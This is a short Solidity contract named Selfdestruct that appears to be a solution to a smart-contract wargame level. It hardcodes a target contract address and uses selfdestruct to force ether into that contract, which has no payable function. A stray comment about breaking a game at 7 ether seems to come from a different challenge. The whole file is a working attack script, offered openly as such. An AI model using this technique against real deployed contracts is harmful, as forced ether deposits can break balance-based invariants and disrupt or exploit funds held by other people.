// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Force.sol';

contract Selfdestruct {
    Force force;

    constructor() public {
        force = Force(0xaA7430f2549A25a083018b4b4cd25A1280765bD4);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }

    receive() external payable {}
}